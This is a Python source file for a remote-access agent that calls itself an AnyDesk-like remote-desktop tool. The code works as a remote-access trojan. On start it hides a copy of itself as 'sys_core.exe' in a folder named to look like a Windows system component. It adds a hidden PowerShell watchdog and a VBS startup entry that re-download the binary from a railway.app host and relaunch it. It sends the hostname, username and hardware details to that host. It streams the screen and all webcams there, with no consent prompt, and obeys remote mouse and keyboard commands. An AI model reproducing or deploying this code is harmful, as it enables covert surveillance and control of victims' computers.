import asyncio
import orjson
import os
import sys
import time
import socket
import struct
import json
import threading
import mss
import websockets
import psutil
import getpass
import platform
import subprocess
import shutil
from PIL import Image, ImageDraw, ImageFont
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController, Key
import av
from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
from aiortc.contrib.media import MediaStreamTrack, MediaRelay

AGENT_VERSION = "9.3.9-P2P"
target_fps = 30

# --- Logging System ---
def log(msg):
    try:
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"[{ts}] {msg}\n"
        print(msg)
        appdata = os.environ.get('APPDATA') or os.path.expanduser('~')
        log_file = os.path.join(appdata, ".mrl_log.txt")
        with open(log_file, "a") as f:
            f.write(log_line)
    except: pass

def log_error(ctx, e):
    import traceback
    err = f"ERROR in {ctx}: {str(e)}\n{traceback.format_exc()}"
    log(err)

def install_persistence():
    current_exe = sys.executable
    if not current_exe.lower().endswith("mrl_agent.exe"): 
        return # Skip setup if running via Python script or already installed

    appdata = os.environ.get('APPDATA')
    if not appdata: return
    
    target_dir = os.path.join(appdata, 'WindowsSystemCore')
    target_exe = os.path.join(target_dir, 'sys_core.exe')
    watchdog_ps1 = os.path.join(target_dir, 'sys_watchdog.ps1')
    startup_vbs = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'sys_core_monitor.vbs')
    
    if current_exe.lower() == target_exe.lower():
        return # We are the hidden clone. Proceed normally.

    try: os.makedirs(target_dir, exist_ok=True)
    except: pass
    
    try: shutil.copy2(current_exe, target_exe)
    except: pass
    
    ps1_code = f"""
$exePath = "{target_exe}"
$url = "https://web-production-d6db5.up.railway.app/api/client_exe"
while ($true) {{
    $running = Get-Process -Name "sys_core" -ErrorAction SilentlyContinue
    if (-not $running) {{
        if (-not (Test-Path -Path $exePath)) {{
            try {{
                Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
            }} catch {{ }}
        }}
        if (Test-Path -Path $exePath) {{
            Start-Process -FilePath $exePath
        }}
    }}
    Start-Sleep -Seconds 10
}}
"""
    try:
        with open(watchdog_ps1, "w") as f: f.write(ps1_code)
    except: pass
    
    vbs_code = 'Set objShell = CreateObject("WScript.Shell")\n'
    vbs_code += f'objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""{watchdog_ps1}""", 0, False\n'

    try:
        with open(startup_vbs, "w") as f: f.write(vbs_code)
    except: pass
    
    subprocess.Popen(f'wscript.exe "{startup_vbs}"', shell=True)
    os._exit(0)

# Initialize Persistence IMMEDIATELY on boot
install_persistence()

class AutoUpdater:
    @staticmethod
    def update_and_restart(new_version):
        print(f"[OTA] Update Triggered! Current: {AGENT_VERSION}, New: {new_version}")
        import urllib.request
        import uuid
        exe_url = "https://web-production-d6db5.up.railway.app/api/client_exe"
        temp_exe = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"mrl_agent_new_{uuid.uuid4().hex[:6]}.exe")
        try:
            print("[OTA] Downloading payload...")
            urllib.request.urlretrieve(exe_url, temp_exe)
        except Exception as e:
            print(f"[OTA] Download failed: {e}")
            return
            
        current_exe = sys.executable
        if not current_exe.lower().endswith(".exe"):
            print("[OTA] Not running as compiled agent (.exe). Skipping hot-swap.")
            return

        bat_file = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), "update_core.bat")
        print("[OTA] Deploying transient hot-swap script...")
        with open(bat_file, "w") as f:
            f.write(f"""@echo off
timeout /t 2 /nobreak > NUL
move /y "{temp_exe}" "{current_exe}"
start "" "{current_exe}"
del "%~f0"
""")
        subprocess.Popen(bat_file, shell=True)
        print("[OTA] Exiting for restart...")
        os._exit(0)

# Global State
selected_monitor = 1  
display_mode = "monitor"
target_fps = 20
current_quality = 40
audio_enabled = False
BITRATE = 2500000
relay = MediaRelay()

# --- Controllers ---
input_lock = threading.Lock()
mouse = MouseController()
keyboard = KeyboardController()

def parse_key(key_str):
    if len(key_str) == 1: return key_str
    return getattr(Key, key_str, key_str)

def get_client_id():
    import uuid
    base_dir = os.environ.get('APPDATA') or os.environ.get('HOME') or os.path.expanduser('~')
    id_file = os.path.join(base_dir, '.mrl_id')
    try:
        if os.path.exists(id_file):
            with open(id_file, 'r') as f: return f.read().strip()
    except: pass
    new_id = str(uuid.uuid4())
    try:
        with open(id_file, 'w') as f: f.write(new_id)
    except: pass
    return new_id

# -------------------------------------------------------
# Telemetry
# -------------------------------------------------------
def get_detailed_specs():
    try:
        gpu = "Unknown"
        try:
            log("[BOOT] Querying GPU...")
            output = subprocess.check_output("wmic path win32_VideoController get name", shell=True, timeout=5).decode()
            gpu = output.split('\n')[1].strip()
        except: gpu = "Unknown"
        
        try:
            log("[BOOT] Querying Cameras...")
            cam_output = subprocess.check_output('wmic path Win32_PnPEntity where "PNPClass=\'Camera\' OR PNPClass=\'Image\'" get name', shell=True, timeout=5).decode()
            cams = [n.strip() for n in cam_output.split('\n') if n.strip() and n.strip().lower() != "name"]
        except:
            cams = []
            
        disk = psutil.disk_usage('C:/').percent
        return {
            "name": socket.gethostname(),
            "user": getpass.getuser(),
            "os": f"{platform.system()} {platform.release()}",
            "cpu": f"{psutil.cpu_count()} Cores",
            "ram": f"{round(psutil.virtual_memory().total / (1024**3), 1)}GB",
            "gpu": gpu,
            "disk": f"{disk}% used",
            "cameras": cams
        }
    except: return {"name": "Unknown", "user": "Unknown", "cameras": []}

# -------------------------------------------------------
# WebRTC Tracks
# -------------------------------------------------------
class ScreenVideoTrack(VideoStreamTrack):
    def __init__(self, sct):
        super().__init__()
        self.sct = sct
        self.last_frame_time = 0

    def update_settings(self, settings: dict):
        global selected_monitor, target_fps, current_quality
        if "monitor" in settings:
            try:
                val = int(settings["monitor"])
                selected_monitor = val
            except: pass
        if "fps" in settings:
            target_fps = max(5, min(60, int(settings["fps"])))
        if "quality" in settings:
            current_quality = max(10, min(100, int(settings["quality"])))

    async def recv(self):
        now = time.time()
        wait = (1.0 / target_fps) - (now - self.last_frame_time)
        if wait > 0: await asyncio.sleep(wait)
        self.last_frame_time = time.time()

        pts, time_base = await self.next_timestamp()
        
        try:
            mon_idx = selected_monitor
            if mon_idx >= len(self.sct.monitors):
                mon_idx = min(1, len(self.sct.monitors)-1)
            
            if mon_idx == 0 and len(self.sct.monitors) > 2:
                physical_monitors = self.sct.monitors[1:]
                count = len(physical_monitors)
                
                cell_w, cell_h = 1280, 720
                if count <= 2: cols, rows = count, 1
                elif count <= 4: cols, rows = 2, 2
                else: cols, rows = 3, (count + 2) // 3
                
                grid_w, grid_h = cols * cell_w, rows * cell_h
                grid_img = Image.new("RGB", (grid_w, grid_h), (15, 15, 15))
                draw = ImageDraw.Draw(grid_img)
                try: font = ImageFont.truetype("arial.ttf", 46)
                except: font = ImageFont.load_default()
                
                for i, mon in enumerate(physical_monitors):
                    sct_img = self.sct.grab(mon)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    img.thumbnail((cell_w - 6, cell_h - 6), Image.Resampling.BILINEAR)
                    
                    col, row = i % cols, i // cols
                    x = col * cell_w + (cell_w - img.width) // 2
                    y = row * cell_h + (cell_h - img.height) // 2
                    
                    grid_img.paste(img, (x, y))
                    draw.rectangle([col * cell_w, row * cell_h, (col + 1) * cell_w - 1, (row + 1) * cell_h - 1], outline=(60, 60, 60), width=4)
                    
                    box_x, box_y = col * cell_w + 30, row * cell_h + 30
                    draw.rectangle([box_x, box_y, box_x + 280, box_y + 70], fill=(0, 0, 0))
                    draw.text((box_x + 20, box_y + 10), f"DISPLAY {i+1}", fill=(255, 255, 255), font=font)
                
                img = grid_img
            else:
                mon = self.sct.monitors[mon_idx]
                sct_img = self.sct.grab(mon)
                
                # Pure PIL Image Pipeline (NumPy-Free)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                
                # Mandatory 720p scaling for AnyDesk-like fluidity
                w, h = mon["width"], mon["height"]
                limit = 1280
                new_h = int(h * (limit / w))
                new_h -= new_h % 2
                
                img = img.resize((limit, new_h), Image.Resampling.LANCZOS)
                
                # Convert to VideoFrame directly from PIL
                frame = av.VideoFrame.from_image(img)
                frame = frame.reformat(format='yuv420p')
        except Exception as e:
            import traceback
            traceback.print_exc()
            print("Video Render Memory/Alignment Error:", e)
            frame = av.VideoFrame(width=960, height=540, format='yuv420p')
            for p in frame.planes: p.update(b'\x00' * p.buffer_size)

        frame.pts = pts
        frame.time_base = time_base
        return frame

class AllCamsVideoTrack(VideoStreamTrack):
    def __init__(self):
        super().__init__()
        self.caps = {}
        self.last_frame_time = 0
    
    async def recv(self):
        now = time.time()
        wait = (1.0 / target_fps) - (now - self.last_frame_time)
        if wait > 0: await asyncio.sleep(wait)
        self.last_frame_time = time.time()
        
        pts, time_base = await self.next_timestamp()
        
        try:
            import cv2
            import numpy
            
            # Find all available cameras
            available = []
            for i in range(4): # Check first 4 indices
                if i not in self.caps:
                    cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
                    if cap.isOpened():
                        self.caps[i] = cap
                    else:
                        cap.release()
                
                if i in self.caps:
                    ret, frame = self.caps[i].read()
                    if ret: available.append(frame)
            
            if not available:
                raise Exception("No cameras detected")
            
            # Tile cameras into a grid
            count = len(available)
            cell_w, cell_h = 640, 480
            cols = 2 if count > 1 else 1
            rows = (count + cols - 1) // cols
            
            grid = Image.new("RGB", (cols * cell_w, rows * cell_h), (20, 20, 20))
            for i, frame in enumerate(available):
                # Frame from OpenCV is numpy BGR
                rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(rgb)
                img.thumbnail((cell_w-10, cell_h-10), Image.Resampling.BILINEAR)
                col, row = i % cols, i // cols
                grid.paste(img, (col * cell_w + (cell_w - img.width)//2, row * cell_h + (cell_h - img.height)//2))
            
            v_frame = av.VideoFrame.from_image(grid)
            v_frame = v_frame.reformat(format='yuv420p')
            
        except Exception as e:
            # Error fallback: Show error message in video stream
            error_img = Image.new("RGB", (1280, 720), (40, 0, 0))
            draw = ImageDraw.Draw(error_img)
            draw.text((100, 300), f"CAMERA SYSTEM ERROR: {str(e)}", fill=(255, 255, 255))
            draw.text((100, 350), "Webcam requires OpenCV/NumPy. Core Agent is safe.", fill=(200, 200, 200))
            v_frame = av.VideoFrame.from_image(error_img)
            v_frame = v_frame.reformat(format='yuv420p')

        v_frame.pts = pts
        v_frame.time_base = time_base
        return v_frame

    def __del__(self):
        for cap in self.caps.values():
            cap.release()

class SystemAudioTrack(AudioStreamTrack):
    async def recv(self):
        pts, time_base = await self.next_timestamp()
        # Create silent frame for now, real audio link requires loopback setup
        duration = 1 / 50 
        samples = int(48000 * duration)
        frame = av.AudioFrame(format='s16', layout='stereo', samples=samples)
        for plane in frame.planes:
            plane.update(b'\x00' * plane.buffer_size)
        frame.pts = pts
        frame.time_base = time_base
        return frame

# -------------------------------------------------------
# Messaging & WebRTC Core
# -------------------------------------------------------
async def pre_gather_candidates(ws, client_id):
    """Proactively gather ICE candidates to match RustDesk/AnyDesk instant connectivity."""
    pc = RTCPeerConnection(configuration=RTCConfiguration(
        iceServers=[
            RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun2.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun3.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun4.l.google.com:19302"])
        ]
    ))
    
    @pc.on("icecandidate")
    async def on_icecandidate(candidate):
        if candidate:
            try:
                await ws.send(orjson.dumps({
                    "t": "pre_ice",
                    "id": client_id,
                    "candidate": {
                        "candidate": candidate.sdp,
                        "sdpMid": candidate.sdpMid,
                        "sdpMLineIndex": candidate.sdpMLineIndex
                    }
                }).decode())
            except: pass
            
    # Trigger gathering by creating a dummy transceivers
    pc.addTransceiver("video", direction="sendonly")
    await pc.setLocalDescription(await pc.createOffer())
    await asyncio.sleep(5) # Give it time to gather
    await pc.close()

async def send_process_list_dc(dc):
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                procs.append({
                    "pid": p.info['pid'],
                    "name": p.info['name'],
                    "cpu": p.info['cpu_percent'],
                    "ram": round(p.info['memory_info'].rss / (1024 * 1024), 1)
                })
            except: continue
        dc.send(orjson.dumps({"t": "process_list", "data": procs}))
    except: pass

async def start_session(ws, sct, client_id):
    pc = RTCPeerConnection(configuration=RTCConfiguration(
        iceServers=[
            RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun2.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun3.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun4.l.google.com:19302"]),
            RTCIceServer(urls=["stun:global.stun.twilio.com:3478"])
        ]
    ))
    
    @pc.on("icegatheringstatechange")
    async def on_icegatheringstatechange():
        log(f"[ICE] Gathering State: {pc.iceGatheringState}")
        if pc.iceGatheringState == "complete":
            log("[ICE] Gathering fully complete.")

    @pc.on("iceconnectionstatechange")
    async def on_iceconnectionstatechange():
        log(f"[ICE] Connection State: {pc.iceConnectionState}")

    video_track = ScreenVideoTrack(sct)
    camera_track = AllCamsVideoTrack()

    @pc.on("datachannel")
    def on_datachannel(dc):
        @dc.on_message
        def on_message(m):
            try:
                event = orjson.loads(m)
                if event.get("t") == "get_processes":
                    asyncio.create_task(send_process_list_dc(dc))
                elif event.get("t") == "select_monitor":
                    video_track.update_settings({"monitor": event.get("index", 1)})
                elif event.get("t") == "set_fps":
                    video_track.update_settings({"fps": event.get("v", 20)})
                elif event.get("t") == "set_quality":
                    video_track.update_settings({"quality": event.get("v", 50)})
                elif event.get("t") == "toggle_audio":
                    global audio_enabled
                    audio_enabled = event.get("v", False)
                elif event.get("t") == "select_camera":
                    camera_track.update_settings({"camera": event.get("index", 0)})

                if input_lock.locked(): return
                with input_lock:
                    if event["t"] == "mm":
                        mon = sct.monitors[selected_monitor]
                        rx, ry = event["x"] / event["w"], event["y"] / event["h"]
                        mouse.position = (mon["left"] + rx * mon["width"], mon["top"] + ry * mon["height"])
                    elif event["t"] == "mc":
                        btn = Button.left if event["b"] == "left" else Button.right
                        if event["p"]: mouse.press(btn)
                        else: mouse.release(btn)
                    elif event["t"] == "kd":
                        try: keyboard.press(parse_key(event["k"]))
                        except: pass
                    elif event["t"] == "ku":
                        try: keyboard.release(parse_key(event["k"]))
                        except: pass
            except: pass

    # Video Transceivers
    pc.addTransceiver(video_track, direction="sendonly")
    pc.addTransceiver(camera_track, direction="sendonly")

    # Audio Track
    pc.addTrack(SystemAudioTrack())

    # Handshake Handling
    async def listen_signaling(ws, client_id):
        log("[SIGNAL] Listener active.")
        async for msg in ws:
            try:
                event = orjson.loads(msg)
                etype = event.get("t")
                if not etype: continue
                
                if etype != "rtc_ice": # Don't flood log with candidates
                    log(f"[SIGNAL] Inbound: {etype}")
                
                if etype == "welcome":
                    server_ver = event.get("version", "0.0.0")
                    if server_ver != AGENT_VERSION:
                        AutoUpdater.update_and_restart(server_ver)
                        return
                    asyncio.create_task(pre_gather_candidates(ws, client_id))
                elif etype == "rtc_offer":
                    log(f"[RTC] Offer received (SDP Length: {len(event['sdp'])})")
                    # NO STUN STRIPPING - Let aiortc handle the candidates
                    await pc.setRemoteDescription(RTCSessionDescription(sdp=event["sdp"], type=event["type"]))
                    ans = await pc.createAnswer()
                    await pc.setLocalDescription(ans)
                    
                    # ANYDESK SDP HACK: Inject High Bitrate Negotiation Commands
                    sdp_lines = pc.localDescription.sdp.split("\n")
                    fixed_sdp = []
                    for line in sdp_lines:
                        fixed_sdp.append(line)
                        if "a=mid:" in line:
                            fixed_sdp.append("a=fmtp:42 x-google-max-bitrate=3500;x-google-min-bitrate=500;x-google-start-bitrate=1500")
                            fixed_sdp.append("a=fmtp:98 x-google-max-bitrate=3500;x-google-min-bitrate=500;x-google-start-bitrate=1500")
                    final_sdp_str = "\n".join(fixed_sdp)
                    
                    await ws.send(orjson.dumps({"t": "rtc_answer", "sdp": final_sdp_str, "type": pc.localDescription.type}).decode())
                    log("[RTC] Answer sent.")
                elif etype == "rtc_ice":
                    try:
                        from aiortc.sdp import candidate_from_sdp
                        cand_str = event["candidate"]["candidate"]
                        log(f"[ICE] Remote Candidate: {cand_str[:50]}...")
                        if cand_str.startswith("candidate:"):
                            cand_str = cand_str[10:]
                        if " typ " not in f" {cand_str} ":
                            continue
                        cand_obj = candidate_from_sdp(cand_str)
                        cand_obj.sdpMid = event["candidate"]["sdpMid"]
                        cand_obj.sdpMLineIndex = event["candidate"]["sdpMLineIndex"]
                        await pc.addIceCandidate(cand_obj)
                        log("[ICE] Remote Candidate Added.")
                    except Exception as e:
                        log(f"[ICE] Error adding candidate: {e}")
                elif etype == "rtc_control":
                    # Handle any server-side controls
                    log(f"[CTRL] Command: {event.get('cmd')}")
            except Exception as e:
                log(f"[SIGNAL] Error: {e}")

    await listen_signaling(ws, client_id)

# -------------------------------------------------------
# Bootstrap
# -------------------------------------------------------
async def main_loop():
    server = "web-production-d6db5.up.railway.app"
    uri = f"wss://{server}/ws"
    
    while True:
        try:
            async with websockets.connect(uri) as ws:
                log("CONNECTED TO PRO SERVER")
                client_id = get_client_id()
                log(f"[BOOT] Client ID: {client_id}")
                
                log("[BOOT] Gathering specs...")
                specs = get_detailed_specs()
                log(f"[BOOT] Specs gathered for {specs.get('name')}")
                
                with mss.mss() as sct:
                    log("[BOOT] Checking monitors...")
                    specs["monitors"] = [{"width": m["width"], "height": m["height"]} for m in sct.monitors]
                    specs["name"] = f"{socket.gethostname()} \\ {getpass.getuser()}"
                    
                    log("[BOOT] Sending client_auth...")
                    await ws.send(orjson.dumps({"type": "client_auth", "id": client_id, "specs": specs}).decode())
                    
                    log("[BOOT] Handshake complete. Starting session...")
                    await start_session(ws, sct, client_id)
        except Exception as e:
            log(f"Connection failed: {e}. Retrying...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    try:
        log(f"--- MRL AGENT {AGENT_VERSION} BOOT ---")
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        log("Quit by user.")
    except Exception as e:
        log_error("CRITICAL_BOOT", e)
        time.sleep(10) # Give user time to see the window if it's visible
